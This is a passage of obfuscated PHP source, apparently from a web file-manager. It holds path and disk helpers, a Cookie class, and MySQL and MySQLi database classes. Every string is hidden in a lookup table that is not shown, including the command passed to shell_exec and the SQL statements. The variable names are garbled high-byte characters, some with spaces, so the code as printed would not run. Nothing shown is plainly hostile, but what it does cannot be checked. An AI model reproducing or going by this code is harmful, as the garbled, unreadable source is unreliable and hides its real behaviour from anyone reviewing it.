$•öù‚Šƒ = '', $ èç¬£ì = '') { $èÅ¡¦Š =& $_SERVER[—ÌÒğš÷]; $…ú½é„¨ = substr($‡³íÖ†Ì, 1, -1); $¿’ò¥ã = $èÅ¡¦Š[1325] . $…ú½é„¨ . $èÅ¡¦Š[1326] . $•öù‚Šƒ . $èÅ¡¦Š[1327]; $¿’ò¥ã = $ èç¬£ì ? $¿’ò¥ã . $ èç¬£ì . $èÅ¡¦Š[8] : $¿’ò¥ã; return $¿’ò¥ã; } public static function hashPath($§ÇÏŒÂŸ, $†Äã·Ô = true) { $ìÀŠ—ßˆ =& $_SERVER[—ÌÒğš÷]; $ÑæŸ‹ôÓ = is_array($§ÇÏŒÂŸ) ? $§ÇÏŒÂŸ : IO::info($§ÇÏŒÂŸ); $ŒÂÉ©‹³ = _get($ÑæŸ‹ôÓ, $ìÀŠ—ßˆ[1328], $ìÀŠ—ßˆ[12]); if (!$ŒÂÉ©‹³ && isset($ÑæŸ‹ôÓ[$ìÀŠ—ßˆ[219]])) { $ŒÂÉ©‹³ = trim($ÑæŸ‹ôÓ[$ìÀŠ—ßˆ[219]], $ìÀŠ—ßˆ[118]); } if (!$ŒÂÉ©‹³ && isset($ÑæŸ‹ôÓ[$ìÀŠ—ßˆ[181]]) && $ÑæŸ‹ôÓ[$ìÀŠ—ßˆ[181]]) { $ÑæŸ‹ôÓ = IO::info(KodIO::make($ÑæŸ‹ôÓ[$ìÀŠ—ßˆ[181]])); $ŒÂÉ©‹³ = _get($ÑæŸ‹ôÓ, $ìÀŠ—ßˆ[1328], $ìÀŠ—ßˆ[12]); } $Öõ×Ÿò± = md5($ÑæŸ‹ôÓ[$ìÀŠ—ßˆ[84]] . $ÑæŸ‹ôÓ[$ìÀŠ—ßˆ[76]] . $ÑæŸ‹ôÓ[$ìÀŠ—ßˆ[85]]); if (!$ŒÂÉ©‹³ && file_exists($ÑæŸ‹ôÓ[$ìÀŠ—ßˆ[84]])) { $ŒÂÉ©‹³ = Cache::get($Öõ×Ÿò± . $ìÀŠ—ßˆ[1329]); $ŒÂÉ©‹³ = !1; if (!$ŒÂÉ©‹³) { $ŒÂÉ©‹³ = IO::hashSimple($ÑæŸ‹ôÓ[$ìÀŠ—ßˆ[84]]); Cache::set($Öõ×Ÿò± . $ìÀŠ—ßˆ[1329], $ŒÂÉ©‹³, 3600 * 24 * 30); } } if ($†Äã·Ô && !$ŒÂÉ©‹³) { } return $ŒÂÉ©‹³ ? $ŒÂÉ©‹³ : $Öõ×Ÿò±; } public static function hashPathSafe($Şˆ¹, $³òˆ‘¹ = true) { $ä‚œû§³ =& $_SERVER[—ÌÒğš÷]; $ÀÏ÷«äØ = self::hashPath($Şˆ¹, $³òˆ‘¹); return md5($ÀÏ÷«äØ . $ä‚œû§³[1330] . Model($ä‚œû§³[806])->get($ä‚œû§³[807])); } public static function initSystemPath() { $Â‹åèˆí =& $_SERVER[—ÌÒğš÷]; if (defined($Â‹åèˆí[1331])) { return; } define($Â‹åèˆí[1331], self::systemPath($Â‹åèˆí[179])); define($Â‹åèˆí[1332], self::systemPath($Â‹åèˆí[1333])); define($Â‹åèˆí[1334], self::systemPath($Â‹åèˆí[1335])); define($Â‹åèˆí[1336], self::systemPath($Â‹åèˆí[1337])); IOHistory::bindEvent(); } public static function systemPath($ªÁÌ§õ) { $…ÂÛ™öÏ =& $_SERVER[—ÌÒğš÷]; $…É¢å°Ï = $…ÂÛ™öÏ[1338] . ucfirst($ªÁÌ§õ); $ÜÏ²§³ó = Model($…ÂÛ™öÏ[806])->get($…É¢å°Ï); if ($ÜÏ²§³ó) { return $ÜÏ²§³ó; } if ($ªÁÌ§õ == $…ÂÛ™öÏ[179]) { $ÜÏ²§³ó = self::make(Model($…ÂÛ™öÏ[861])->systemRootPathAdd($…ÂÛ™öÏ[574])); } else { $ÜÏ²§³ó = self::systemPath($…ÂÛ™öÏ[179]); $¶ƒ®ÜÜ¯ = self::sourceID($ÜÏ²§³ó); $ÜÏ²§³ó = self::make(Model($…ÂÛ™öÏ[861])->mkdir($¶ƒ®ÜÜ¯, $ªÁÌ§õ)); } Model($…ÂÛ™öÏ[806])->set($…É¢å°Ï, $ÜÏ²§³ó); return $ÜÏ²§³ó; } public static function systemFolder($úÛäÁÃ’) { $Á‹íîÊ = IO_PATH_SYSTEM_SOURCE . $úÛäÁÃ’; $®§ò…Üı = Cache::get($Á‹íîÊ); if (!$®§ò…Üı) { $ÕÇ”ˆƒê = IO::infoFullSimple($Á‹íîÊ); if (!$ÕÇ”ˆƒê) { $®§ò…Üı = IO::mkdir($Á‹íîÊ, REPEAT_SKIP); } else { $®§ò…Üı = $ÕÇ”ˆƒê[$_SERVER[—ÌÒğš÷][84]]; } Cache::set($Á‹íîÊ, $®§ò…Üı, 3600 * 10); } return $®§ò…Üı; } public static function defaultDriver() { return Model($_SERVER[—ÌÒğš÷][803])->defaultDriver(); } public static function defaultIO() { $˜Ú¨çÊ =& $_SERVER[—ÌÒğš÷]; $¨º×ˆè„ = self::defaultDriver(); return $˜Ú¨çÊ[1339] . $¨º×ˆè„[$˜Ú¨çÊ[443]] . $˜Ú¨çÊ[1327]; } public static function defaultDriverInit() { static $…Ÿ‡º£Ã = false; if ($…Ÿ‡º£Ã) { return $…Ÿ‡º£Ã; } $…Ÿ‡º£Ã = IO::init(self::defaultIO()); return $…Ÿ‡º£Ã; } public static function fileTypeList() { $¹şèˆ…¦ =& $_SERVER[—ÌÒğš÷]; $İ‰­¸í× = $GLOBALS[$¹şèˆ…¦[6]][$¹şèˆ…¦[1340]]; foreach ($İ‰­¸í× as $´Š  ç => $×§Ù«Î) { $ó¼üáîö = $¹şèˆ…¦[1341] . $´Š  ç; $¾€ÁüŠİ = LNG($ó¼üáîö); if ($ó¼üáîö != $¾€ÁüŠİ) { $İ‰­¸í×[$´Š  ç][$¹şèˆ…¦[32]] = $¾€ÁüŠİ; } } return $İ‰­¸í×; } public static function diskList($«Ç÷Ü¿ = true) { $„œ×¶Ô£ = $_SERVER[—ÌÒğš÷][1342]; if ($«Ç÷Ü¿) { $ñ–Ó§­” = Cache::get($„œ×¶Ô£); if (is_array($ñ–Ó§­”)) { return $ñ–Ó§­”; } } $ñ–Ó§­” = self::diskListGet(); Cache::set($„œ×¶Ô£, $ñ–Ó§­”, 60); return $ñ–Ó§­”; } public static function diskListGet() { $»‡¥¹ — =& $_SERVER[—ÌÒğš÷]; $ŞÀıÑ´Ô = array(); if ($GLOBALS[$»‡¥¹ —[6]][$»‡¥¹ —[1343]] == $»‡¥¹ —[1344]) { $âüÙ‹… = $»‡¥¹ —[1345]; for ($ÌŒØŞÈ = 0; $ÌŒØŞÈ < strlen($âüÙ‹…); $ÌŒØŞÈ++) { $„“€ÎÂ³ = $âüÙ‹…[$ÌŒØŞÈ] . $»‡¥¹ —[1346]; if (file_exists($„“€ÎÂ³)) { $ŞÀıÑ´Ô[] = $„“€ÎÂ³; } } return $ŞÀıÑ´Ô; } if (!function_exists($»‡¥¹ —[98])) { $ŞÀıÑ´Ô[] = $»‡¥¹ —[872]; return $ŞÀıÑ´Ô; } $½•ã¨Ø¶ = explode($»‡¥¹ —[246], shell_exec($»‡¥¹ —[1347])); array_shift($½•ã¨Ø¶); array_pop($½•ã¨Ø¶); $¨’µ¿¡ = array($»‡¥¹ —[1348], $»‡¥¹ —[1349], $»‡¥¹ —[1350], $»‡¥¹ —[1351], $»‡¥¹ —[1352], $»‡¥¹ —[1353], $»‡¥¹ —[1354], $»‡¥¹ —[1355]); foreach ($½•ã¨Ø¶ as $æƒàîÁÏ) { $ÔáÔÓ¢È = preg_split($»‡¥¹ —[1356], $æƒàîÁÏ); $„“€ÎÂ³ = $ÔáÔÓ¢È[count($ÔáÔÓ¢È) - 1]; if (!strstr($ÔáÔÓ¢È[0], $»‡¥¹ —[1357]) || !$„“€ÎÂ³) { continue; } $¢‘•¢ì = rtrim($„“€ÎÂ³, $»‡¥¹ —[8]) . $»‡¥¹ —[8]; if (in_array($¢‘•¢ì, $¨’µ¿¡)) { continue; } $ŞÀıÑ´Ô[] = $¢‘•¢ì; } return $ŞÀıÑ´Ô; } public static function isSameDisk($úì«¼ù, $‡ŠÒ›Š) { $ê¦Öî¾¹ =& $_SERVER[—ÌÒğš÷]; if ($GLOBALS[$ê¦Öî¾¹[6]][$ê¦Öî¾¹[1343]] == $ê¦Öî¾¹[1344]) { return strtolower(substr($úì«¼ù, 0, 1)) == strtolower(substr($‡ŠÒ›Š, 0, 1)); } $£Ó´¾“ò = self::diskList(); $âŒŞŞ = !1; $¯‰…õ½£ = !1; sort($£Ó´¾“ò); $£Ó´¾“ò = array_reverse($£Ó´¾“ò); $úì«¼ù = rtrim($úì«¼ù, $ê¦Öî¾¹[8]) . $ê¦Öî¾¹[8]; $‡ŠÒ›Š = rtrim($‡ŠÒ›Š, $ê¦Öî¾¹[8]) . $ê¦Öî¾¹[8]; foreach ($£Ó´¾“ò as $è–¨ş) { $–ƒà÷Î“ = strlen($è–¨ş); if (!$âŒŞŞ && substr($úì«¼ù, 0, $–ƒà÷Î“) == $è–¨ş) { $âŒŞŞ = $è–¨ş; } if (!$¯‰…õ½£ && substr($‡ŠÒ›Š, 0, $–ƒà÷Î“) == $è–¨ş) { $¯‰…õ½£ = $è–¨ş; } if ($âŒŞŞ && $¯‰…õ½£) { break; } } return $âŒŞŞ === $¯‰…õ½£; } public static function transferType($Ø‚Ğâ€¾, $û„®×†Ì) { $ª·¯×àÒ =& $_SERVER[—ÌÒğš÷]; $µÎ‘¶üû = self::driverType($Ø‚Ğâ€¾); $‹ôà¹ºº = self::driverType($û„®×†Ì); if ($µÎ‘¶üû[$ª·¯×àÒ[33]] == $‹ôà¹ºº[$ª·¯×àÒ[33]] && $µÎ‘¶üû[$ª·¯×àÒ[1358]] == $‹ôà¹ºº[$ª·¯×àÒ[1358]]) { return $ª·¯×àÒ[1359]; } if ($µÎ‘¶üû[$ª·¯×àÒ[33]] == $ª·¯×àÒ[913] && $‹ôà¹ºº[$ª·¯×àÒ[33]] == $ª·¯×àÒ[106]) { return $ª·¯×àÒ[1238]; } if ($µÎ‘¶üû[$ª·¯×àÒ[33]] == $ª·¯×àÒ[106] && $‹ôà¹ºº[$ª·¯×àÒ[33]] == $ª·¯×àÒ[913]) { return $ª·¯×àÒ[107]; } return $ª·¯×àÒ[1360]; } public static function driverType($îú–‡œŒ) { $Ìø•˜¬à =& $_SERVER[—ÌÒğš÷]; $÷äë‹¦¤ = str_replace($Ìø•˜¬à[1361], $Ìø•˜¬à[12], strtolower($îú–‡œŒ->getType())); if ($÷äë‹¦¤ == $Ìø•˜¬à[793] || $÷äë‹¦¤ == $Ìø•˜¬à[1362] || $÷äë‹¦¤ == $Ìø•˜¬à[1363]) { $îú–‡œŒ = self::defaultDriverInit(); } else { if ($÷äë‹¦¤ == $Ìø•˜¬à[1248] || $÷äë‹¦¤ == $Ìø•˜¬à[1364]) { $îú–‡œŒ = IO::init($îú–‡œŒ->pathParse[$Ìø•˜¬à[1195]]); } } $Ã›ğÅ‚ = $îú–‡œŒ->path; $÷äë‹¦¤ = str_replace($Ìø•˜¬à[1361], $Ìø•˜¬à[12], strtolower($îú–‡œŒ->getType())); if ($÷äë‹¦¤ == $Ìø•˜¬à[106]) { return array($Ìø•˜¬à[33] => $Ìø•˜¬à[106], $Ìø•˜¬à[1358] => $Ìø•˜¬à[12], $Ìø•˜¬à[84] => $Ã›ğÅ‚, $Ìø•˜¬à[95] => $îú–‡œŒ); } return array($Ìø•˜¬à[33] => $Ìø•˜¬à[913], $Ìø•˜¬à[1358] => $îú–‡œŒ->pathDriver, $Ìø•˜¬à[84] => $Ã›ğÅ‚, $Ìø•˜¬à[95] => $îú–‡œŒ); } public static function pathDriverType($¢Óò‡Éâ) { return $¢Óò‡Éâ ? self::driverType(IO::init($¢Óò‡Éâ)) : !1; } public static function pathDriverLocal($·Ú¨½—ö) { $à¨şğ´ã =& $_SERVER[—ÌÒğš÷]; $Óî±˜¾™ = $·Ú¨½—ö ? self::driverType(IO::init($·Ú¨½—ö)) : !1; return $Óî±˜¾™[$à¨şğ´ã[33]] == $à¨şğ´ã[106] ? !0 : !1; } public static function allowCover($¥½äŒ’, $î•û–ö = true) { $Ğ„İşÛ… =& $_SERVER[—ÌÒğš÷]; if (is_string($¥½äŒ’)) { $¥½äŒ’ = IO::info($¥½äŒ’); } if (!$¥½äŒ’ || $¥½äŒ’[$Ğ„İşÛ…[33]] == $Ğ„İşÛ…[75] || $¥½äŒ’[$Ğ„İşÛ…[76]] <= 100) { return !1; } if (isset($¥½äŒ’[$Ğ„İşÛ…[1365]]) || !$¥½äŒ’[$Ğ„İşÛ…[84]]) { return !1; } if (isset($¥½äŒ’[$Ğ„İşÛ…[216]]) && !$¥½äŒ’[$Ğ„İşÛ…[216]]) { return !1; } static $â‡‹Õ× = false; if (!$â‡‹Õ× || !$î•û–ö) { $€²ãÚ¨Ä = self::driverType(IO::init($¥½äŒ’[$Ğ„İşÛ…[84]])); $’Äöªü = $€²ãÚ¨Ä[$Ğ„İşÛ…[95]]; $â‡‹Õ× = $Ğ„İşÛ…[184]; if ($€²ãÚ¨Ä[$Ğ„İşÛ…[33]] == $Ğ„İşÛ…[106]) { $â‡‹Õ× = $Ğ„İşÛ…[1366]; } if ($€²ãÚ¨Ä[$Ğ„İşÛ…[95]] && is_array($€²ãÚ¨Ä[$Ğ„İşÛ…[95]]->config)) { $ëûâå‡ì = $€²ãÚ¨Ä[$Ğ„İşÛ…[95]]->config; if (isset($ëûâå‡ì[$Ğ„İşÛ…[1367]]) && $ëûâå‡ì[$Ğ„İşÛ…[1367]]) { $â‡‹Õ× = $Ğ„İşÛ…[1366]; } } } return $â‡‹Õ× == $Ğ„İşÛ…[1366] ? !0 : !1; } } goto D‹õÂ…áÍ ; c£ğ¸ƒˆ¢‹: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($äÖÏÅÏ = '', $ÀÂÁ³³ = 0) { if (is_string($äÖÏÅÏ) && $äÖÏÅÏ != $_SERVER[—ÌÒğš÷][12]) { $this->prefix = $äÖÏÅÏ; } if (is_numeric($ÀÂÁ³³) && $ÀÂÁ³³ > 0) { $this->expire = $ÀÂÁ³³; } } public static function getInstance() { static $Ò»ı·É; if ($Ò»ı·É === null) { $Ò»ı·É = new self(); } return $Ò»ı·É; } private static $cookieDisable = false; public static function disable($ ÑË¿³Ö) { self::$cookieDisable = $ ÑË¿³Ö; } private static $sameCookieSet = array(); public static function set($Û‚†éŸÓ, $ñŒÓ«îà, $Ïç¾©êõ = 0, $ÃÆëô„ = false, $±”ÇÅüÕ = false) { $Â„¯§Ñƒ =& $_SERVER[—ÌÒğš÷]; if (self::$cookieDisable) { return; } if (!$Ïç¾©êõ) { $Ïç¾©êõ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Û‚†éŸÓ]) && self::$sameCookieSet[$Û‚†éŸÓ] == $ñŒÓ«îà . $Ïç¾©êõ) { return; } self::$sameCookieSet[$Û‚†éŸÓ] = $ñŒÓ«îà . $Ïç¾©êõ; if (!$±”ÇÅüÕ) { $±”ÇÅüÕ = str_replace(HOST, $Â„¯§Ñƒ[12], APP_HOST); $±”ÇÅüÕ = _get($GLOBALS, $Â„¯§Ñƒ[926], $±”ÇÅüÕ); } $Õ†´–¬´ = $Â„¯§Ñƒ[12]; setcookie($Û‚†éŸÓ, $ñŒÓ«îà, time() + $Ïç¾©êõ, $Â„¯§Ñƒ[8] . trim($±”ÇÅüÕ, $Â„¯§Ñƒ[8]) . $Õ†´–¬´, !1, !1, $ÃÆëô„); } public static function setSafe($“ìÎ´©Ï, $ºèÊš¯î, $İ•¶‹Àß = 0) { self::set($“ìÎ´©Ï, $ºèÊš¯î, $İ•¶‹Àß, !0); } public static function get($ùÒì€É) { static $¢æ©££õ = false; if (!$¢æ©££õ) { self::initHeaderCookie(); $¢æ©££õ = !0; } return isset($_COOKIE[$ùÒì€É]) ? $_COOKIE[$ùÒì€É] : !1; } private static function initHeaderCookie() { $àªÁéÙé =& $_SERVER[—ÌÒğš÷]; if (!isset($_SERVER[$àªÁéÙé[927]]) || !$_SERVER[$àªÁéÙé[927]]) { return; } $²¤ôî® = explode($àªÁéÙé[71], $_SERVER[$àªÁéÙé[927]]); foreach ($²¤ôî® as $šÁ–ıïÑ) { $šÁ–ıïÑ = explode($àªÁéÙé[928], $šÁ–ıïÑ); if (count($šÁ–ıïÑ) != 2 || !isset($šÁ–ıïÑ[1])) { continue; } $_COOKIE[trim($šÁ–ıïÑ[0])] = trim($šÁ–ıïÑ[1]); } } public static function remove($ÃÕÅ¥Ñ, $€òóõÊÅ = false) { unset($_COOKIE[$ÃÕÅ¥Ñ]); self::set($ÃÕÅ¥Ñ, $_SERVER[—ÌÒğš÷][12], 1, $€òóõÊÅ); } } class DbMysql extends Db { public function __construct($åúÄö·õ = '') { $©¤üäÏ‚ =& $_SERVER[—ÌÒğš÷]; if (!extension_loaded($©¤üäÏ‚[840])) { think_exception(think_lang($©¤üäÏ‚[14]) . $©¤üäÏ‚[929]); } if (!empty($åúÄö·õ)) { $this->config = $åúÄö·õ; if (empty($this->config[$©¤üäÏ‚[17]])) { $this->config[$©¤üäÏ‚[17]] = $©¤üäÏ‚[12]; } } } public function connect($’ı§Íõ = '', $Ë¼•ã¾ã = 0, $Ä£¿§íÆ = false) { $ŒÚ¸¬«‚ =& $_SERVER[—ÌÒğš÷]; if (!isset($this->linkID[$Ë¼•ã¾ã])) { if (empty($’ı§Íõ)) { $’ı§Íõ = $this->config; } $¿ÁüıÌ‹ = $’ı§Íõ[$ŒÚ¸¬«‚[930]] . ($’ı§Íõ[$ŒÚ¸¬«‚[931]] ? "\72{$’ı§Íõ[$ŒÚ¸¬«‚[931]]}" : $ŒÚ¸¬«‚[12]); $‡ÂÎô§Ü = !empty($’ı§Íõ[$ŒÚ¸¬«‚[17]][$ŒÚ¸¬«‚[18]]) ? $’ı§Íõ[$ŒÚ¸¬«‚[17]][$ŒÚ¸¬«‚[18]] : $this->pconnect; if ($‡ÂÎô§Ü) { $this->linkID[$Ë¼•ã¾ã] = mysql_pconnect($¿ÁüıÌ‹, $’ı§Íõ[$ŒÚ¸¬«‚[932]], $’ı§Íõ[$ŒÚ¸¬«‚[933]], 131072); } else { $this->linkID[$Ë¼•ã¾ã] = mysql_connect($¿ÁüıÌ‹, $’ı§Íõ[$ŒÚ¸¬«‚[932]], $’ı§Íõ[$ŒÚ¸¬«‚[933]], !0, 131072); } if (!$this->linkID[$Ë¼•ã¾ã] || !empty($’ı§Íõ[$ŒÚ¸¬«‚[21]]) && !mysql_select_db($’ı§Íõ[$ŒÚ¸¬«‚[21]], $this->linkID[$Ë¼•ã¾ã])) { think_exception(mysql_error()); } $Åß‘¥‡œ = mysql_get_server_info($this->linkID[$Ë¼•ã¾ã]); mysql_query($ŒÚ¸¬«‚[934] . think_config($ŒÚ¸¬«‚[935]) . $ŒÚ¸¬«‚[58], $this->linkID[$Ë¼•ã¾ã]); if ($Åß‘¥‡œ > $ŒÚ¸¬«‚[936]) { mysql_query($ŒÚ¸¬«‚[937], $this->linkID[$Ë¼•ã¾ã]); } $this->connected = !0; if (1 != think_config($ŒÚ¸¬«‚[22])) { unset($this->config); } } return $this->linkID[$Ë¼•ã¾ã]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($µçñŒƒş) { $ÛİÓ¨èÃ =& $_SERVER[—ÌÒğš÷]; if (0 === stripos($µçñŒƒş, $ÛİÓ¨èÃ[308])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $µçñŒƒş; if ($this->queryID) { $this->free(); } think_action_status($ÛİÓ¨èÃ[23], 1); think_status($ÛİÓ¨èÃ[24]); $this->queryID = mysql_query($µçñŒƒş, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ŒŸ­İ›è) { $ËÊµÙªŞ =& $_SERVER[—ÌÒğš÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ŒŸ­İ›è; if ($this->queryID) { $this->free(); } think_action_status($ËÊµÙªŞ[25], 1); think_status($ËÊµÙªŞ[24]); $ØªÈ§€¤ = mysql_query($ŒŸ­İ›è, $this->_linkID); $this->debug(); if (!1 === $ØªÈ§€¤) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[—ÌÒğš÷][938], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ä„íÂôç = mysql_query($_SERVER[—ÌÒğš÷][939], $this->_linkID); $this->transTimes = 0; if (!$ä„íÂôç) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¥¤öÌ = mysql_query($_SERVER[—ÌÒğš÷][940], $this->_linkID); $this->transTimes = 0; if (!$¥¤öÌ) { $this->error(); return !1; } } return !0; } private function getAll() { $¯€ÎÂ = array(); if ($this->numRows > 0) { while ($Ã¢Ø…à = mysql_fetch_assoc($this->queryID)) { $¯€ÎÂ[] = $Ã¢Ø…à; } mysql_data_seek($this->queryID, 0); } return $¯€ÎÂ; } public function getFields($úãÚ‹ÍÛ) { $İ…˜¹ˆ… =& $_SERVER[—ÌÒğš÷]; $ú† ¿ Â = $this->query($İ…˜¹ˆ…[941] . $this->parseKey($úãÚ‹ÍÛ)); $¢¿ªÊÅı = array(); if ($ú† ¿ Â) { foreach ($ú† ¿ Â as $ËÊ©Üì => $¢ôøÇè) { $¢¿ªÊÅı[$¢ôøÇè[$İ…˜¹ˆ…[31]]] = array($İ…˜¹ˆ…[32] => $¢ôøÇè[$İ…˜¹ˆ…[31]], $İ…˜¹ˆ…[33] => $¢ôøÇè[$İ…˜¹ˆ…[34]], $İ…˜¹ˆ…[35] => (bool) (strtoupper($¢ôøÇè[$İ…˜¹ˆ…[36]]) === $İ…˜¹ˆ…[942]), $İ…˜¹ˆ…[37] => $¢ôøÇè[$İ…˜¹ˆ…[38]], $İ…˜¹ˆ…[39] => strtolower($¢ôøÇè[$İ…˜¹ˆ…[40]]) == $İ…˜¹ˆ…[41], $İ…˜¹ˆ…[42] => strtolower($¢ôøÇè[$İ…˜¹ˆ…[43]]) == $İ…˜¹ˆ…[44]); } } return $¢¿ªÊÅı; } public function getTables($®È™ùëë = '') { $«©„ËÇô =& $_SERVER[—ÌÒğš÷]; if (!empty($®È™ùëë)) { $Ÿ¡”ÄÕè = $«©„ËÇô[943] . $®È™ùëë . $«©„ËÇô[944]; } else { $Ÿ¡”ÄÕè = $«©„ËÇô[945]; } $æ·ş¥†Ğ = $this->query($Ÿ¡”ÄÕè); $‚«œ€Óğ = array(); foreach ($æ·ş¥†Ğ as $óÛí»•İ => $Ò´Àê‹) { $‚«œ€Óğ[$óÛí»•İ] = current($Ò´Àê‹); } return $‚«œ€Óğ; } public function replace($Ë‡÷š¦é, $ä´À±Æ = array()) { $ğÆ¾†ßƒ =& $_SERVER[—ÌÒğš÷]; foreach ($Ë‡÷š¦é as $Äı¤ğöğ => $ƒç‚­â) { $°«¢ã€ = $this->parseValue($ƒç‚­â); if (is_scalar($°«¢ã€)) { $ƒÂ‰Æ‹[] = $°«¢ã€; $´ÜŸŒìà[] = $this->parseKey($Äı¤ğöğ); } } $îŸÄ—úà = $ğÆ¾†ßƒ[946] . $this->parseTable($ä´À±Æ[$ğÆ¾†ßƒ[323]]) . $ğÆ¾†ßƒ[947] . implode($ğÆ¾†ßƒ[50], $´ÜŸŒìà) . $ğÆ¾†ßƒ[948] . implode($ğÆ¾†ßƒ[50], $ƒÂ‰Æ‹) . $ğÆ¾†ßƒ[949]; return $this->execute($îŸÄ—úà); } public function insertAll($¸¿ˆÄº¬, $«Íâôû = array(), $şãÙš×é = false) { $îîÜÄ×è =& $_SERVER[—ÌÒğš÷]; if (!is_array($¸¿ˆÄº¬[0])) { return !1; } $ï›ïëöÔ = array_keys($¸¿ˆÄº¬[0]); $çÍ¶ÇÙ™ = array(); foreach ($¸¿ˆÄº¬ as $ÀÚÀÊ) { $ÓØÇÂıĞ = array(); foreach ($ÀÚÀÊ as $”ãÇéíş => $”¥˜¡„¡) { $”¥˜¡„¡ = $this->parseValue($”¥˜¡„¡); if (is_scalar($”¥˜¡„¡)) { $ÓØÇÂıĞ[] = $”¥˜¡„¡; } } $çÍ¶ÇÙ™[] = $îîÜÄ×è[304] . implode($îîÜÄ×è[50], $ÓØÇÂıĞ) . $îîÜÄ×è[949]; } array_walk($ï›ïëöÔ, array($this, $îîÜÄ×è[950])); $ˆ·¶ÓİÚ = ($şãÙš×é ? $îîÜÄ×è[951] : $îîÜÄ×è[952]) . $îîÜÄ×è[953] . $this->parseTable($«Íâôû[$îîÜÄ×è[323]]) . $îîÜÄ×è[947] . implode($îîÜÄ×è[50], $ï›ïëöÔ) . $îîÜÄ×è[954] . implode($îîÜÄ×è[50], $çÍ¶ÇÙ™); return $this->execute($ˆ·¶ÓİÚ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ï×şŠòê =& $_SERVER[—ÌÒğš÷]; $this->error = mysql_errno() . $ï×şŠòê[4] . mysql_error($this->_linkID); if ($ï×şŠòê[12] != $this->queryStr) { $this->error .= LNG($ï×şŠòê[48]) . $this->queryStr; } think_trace($this->error, $ï×şŠòê[12], $ï×şŠòê[49]); return $this->error; } public function escapeString($’şéêñ¾) { if ($this->_linkID) { return mysql_real_escape_string($’şéêñ¾, $this->_linkID); } else { return mysql_escape_string($’şéêñ¾); } } public function parseKey(&$±é¹¬ã¬, $ˆ…ıÎÛš = true) { $Ç»½ğüÇ =& $_SERVER[—ÌÒğš÷]; if ($ˆ…ıÎÛš) { $±é¹¬ã¬ = $this->parseKeyCheck($±é¹¬ã¬); } if ($±é¹¬ã¬ != $Ç»½ğüÇ[203] && !preg_match($Ç»½ğüÇ[955], $±é¹¬ã¬)) { $±é¹¬ã¬ = $Ç»½ğüÇ[429] . trim($±é¹¬ã¬, $Ç»½ğüÇ[429]) . $Ç»½ğüÇ[429]; } return $±é¹¬ã¬; } } class DbMysqli extends Db { public function __construct($‰¹µ£·È = '') { $—£°ì¯÷ =& $_SERVER[—ÌÒğš÷]; if (!extension_loaded($—£°ì¯÷[956])) { think_exception(think_lang($—£°ì¯÷[14]) . $—£°ì¯÷[957]); } if (!empty($‰¹µ£·È)) { $this->config = $‰¹µ£·È; if (empty($this->config[$—£°ì¯÷[17]])) { $this->config[$—£°ì¯÷[17]] = $—£°ì¯÷[12]; } } } public function connect($æä¬·¡ = '', $–Ñ¯¸“¨ = 0) { $›¸®³Ñ· =& $_SERVER[—ÌÒğš÷]; if (!isset($this->linkID[$–Ñ¯¸“¨])) { if (empty($æä¬·¡)) { $æä¬·¡ = $this->config; } $this->linkID[$–Ñ¯¸“¨] = new mysqli($æä¬·¡[$›¸®³Ñ·[930]], $æä¬·¡[$›¸®³Ñ·[932]], $æä¬·¡[$›¸®³Ñ·[933]], $æä¬·¡[$›¸®³Ñ·[21]], $æä¬·¡[$›¸®³Ñ·[931]] ? intval($æä¬·¡[$›¸®³Ñ·[931]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¹’æ…äù = $this->linkID[$–Ñ¯¸“¨]->server_version; $this->linkID[$–Ñ¯¸“¨]->query($›¸®³Ñ·[934] . think_config($›¸®³Ñ·[935]) . $›¸®³Ñ·[58]); if ($¹’æ…äù > $›¸®³Ñ·[936]) { $this->linkID[$–Ñ¯¸“¨]->query($›¸®³Ñ·[937]); } $this->connected = !0; if (1 != think_config($›¸®³Ñ·[22])) { unset($this->config); } } return $this->linkID[$–Ñ¯¸“¨]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¯×øÈ) { $Œ“¶³üº =& $_SERVER[—ÌÒğš÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¯×øÈ; if ($this->queryID) { $this->free(); } think_action_status($Œ“¶³üº[23], 1); think_status($Œ“¶³üº[24]); $this->queryID = $this->_linkID->query($¯×øÈ); if ($this->_linkID->more_results()) { while (($ñò¸…¾¥ = $this->_linkID->next_result()) != NULL) { $ñò¸…¾¥->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÖÙ–²ß) { $›¥ŒåıÒ =& $_SERVER[—ÌÒğš÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÖÙ–²ß; if ($this->queryID) { $this->free(); } think_action_status($›¥ŒåıÒ[25], 1); think_status($›¥ŒåıÒ[24]); $¸ùØ÷ôá = $this->_linkID->query($ÖÙ–²ß); $this->debug(); if (!1 === $¸ùØ÷ôá) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $´¶ È¨¹ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$´¶ È¨¹) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÃÅÁçÉ¥ = $this->_linkID->rollback(); $this->transTimes = 0; if 